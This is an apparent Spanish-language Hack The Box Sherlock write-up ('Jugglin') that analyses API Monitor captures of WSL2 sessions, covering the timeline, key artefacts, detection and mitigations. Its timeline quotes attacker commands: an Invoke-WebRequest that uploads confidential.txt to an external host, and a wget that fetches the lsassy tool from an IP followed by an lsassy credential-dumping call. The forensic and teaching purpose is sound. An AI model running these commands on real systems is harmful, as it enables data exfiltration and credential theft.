---
sherlock: Jugglin
domain: DFIR
difficulty: Medium
platform: Hack The Box
evidence: Dos capturas de API Monitor (.apmx64) de sesiones WSL2
tools: [API Monitor, CyberChef]
state: Active
tags: [dfir, wsl2, apimonitor, credential-access, exfiltration, t1567]
---

# Jugglin — Hack The Box (Sherlock)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Active. Ficha de investigación; sin respuestas literales de la plataforma.

## Escenario

Una empresa sospecha que se han usado sus estaciones con **WSL2** para mover datos fuera y para volcar credenciales sin dejar rastro en los logs de línea de comandos de Windows. Se entregan dos capturas de llamadas a la API de Windows: una de un empleado y otra de un equipo atacante.

## Evidencias

- `Insider.apmx64`: sesión de API Monitor de la estación del empleado.
- `Attacker.apmx64`: sesión de API Monitor del host atacante.

```bash
sha256sum Insider.apmx64 Attacker.apmx64     # anotar hashes antes de analizar
```

Los `.apmx64` son contenedores: se abren directamente con **API Monitor** (Rohitab), que carga la sesión y deja filtrar por proceso y por API. No son volcados de memoria ni PCAP.

## Investigación

### 1. Inventario y triaje

Lo primero es identificar **qué proceso** genera las llamadas: si aparece `wsl.exe` o `wslhost.exe`, el trabajo ocurre dentro de la distribución Linux y la telemetría de Windows solo verá el puente.

```text
API Monitor → File → Open → Insider.apmx64
Filtro: Process Name = wsl.exe
```

En el árbol de llamadas se ven funciones de conversión de cadenas de `KERNELBASE.dll`, no las de un shell de Linux: la actividad del invitado se traduce a UTF-8/UTF-16 en el lado Windows antes de salir.

### 2. Línea temporal

En la captura del empleado, `wsl.exe` encadena:

```text
WideCharToMultiByte
RtlUnicodeToUTF8N
...
whoami
cat flag.txt
Invoke-WebRequest -Uri http://<EXTERNAL> -Method POST -InFile confidential.txt
```

El orden importa: primero reconocimiento (`whoami`), luego lectura del objetivo y por último la subida. La llamada de red relevante no es de `curl` ni de `wget` del invitado, sino de PowerShell dentro de la sesión, que es lo que queda registrado.

En la captura del atacante aparece la descarga de una herramienta de volcado de LSASS:

```text
wget http://3.6.165.8/lsassy
lsassy -d <DOMAIN> -u <USER>
```

El resultado es el hash del usuario de la sesión, no un volcado completo de `lsass.exe`: `lsassy` lee la memoria del proceso y extrae las credenciales sin generar un `.dmp` en disco, que es justo lo que evita la detección basada en ficheros.

### 3. Artefacto clave

El artefacto que resuelve el caso es la **traza de API de `wsl.exe`**, concretamente el par:

- `RtlUnicodeToUTF8N` / `WideCharToMultiByte`: la frontera entre el invitado y Windows.
- `WriteFile`: la llamada que hay que interceptar para ver qué se escribe y hacia dónde en un entorno WSL2.

Sin esa traza, un EDR que solo audita procesos de Windows no vería ni el `cat` ni la subida: el binario que ejecuta el comando es de Linux y no genera un 4688.

## Conclusiones

- El empleado usó WSL2 para leer un fichero marcado y subirlo por HTTP: exfiltración con herramientas del propio sistema.
- El atacante usó la misma vía para ejecutar `lsassy` y extraer un hash de la memoria de LSASS, sin dejar volcado en disco.
- La actividad es invisible para la auditoría de línea de comandos de Windows porque el proceso que ejecuta los comandos no es un proceso Windows.

## Lecciones

- WSL2 no es "una VM aparte" a efectos forenses: comparte kernel y red con el host y su actividad se puede capturar en la frontera (`wsl.exe`).
- `lsassy` y variantes evitan el fichero `.dmp`; la detección debe mirar el acceso a `lsass.exe` (Sysmon 10 / 4656 con `PROCESS_VM_READ`), no solo la creación de dumps.
- Un `Invoke-WebRequest` a una IP externa desde una sesión interactiva merece alerta, venga del shell que venga.
- Falta telemetría de WSL2 en la organización: sin captura de API o ETW del puente, no hay evidencia.

## Mitigaciones y detección

- Restringir WSL2 por política (Intune/AppLocker) en estaciones que no lo necesiten y auditar su uso.
- Alertar de `wsl.exe` con hijos que hagan red hacia Internet y de procesos que abren `lsass.exe` con `PROCESS_VM_READ`.
- Guardar capturas de API/ETW del puente WSL en los equipos críticos; sin ellas el análisis es a ciegas.
- Revisar `known_hosts`, historial de PowerShell y configuración de proxies para correlacionar.

MITRE: T1567.002 (exfiltration over web service), T1003.001 (LSASS memory), T1059.004 (Unix shell), T1027 (obfuscated files or information).

## Referencias

- <https://mwalkowski.com/post/sherlock-jugglin/>
- <https://medium.com/@chaoskist/htb-sherlocks-write-up-jugglin-d52d7377f5d2>
- <https://learn.microsoft.com/en-us/windows/wsl/>
- <https://github.com/Hackndo/lsassy>
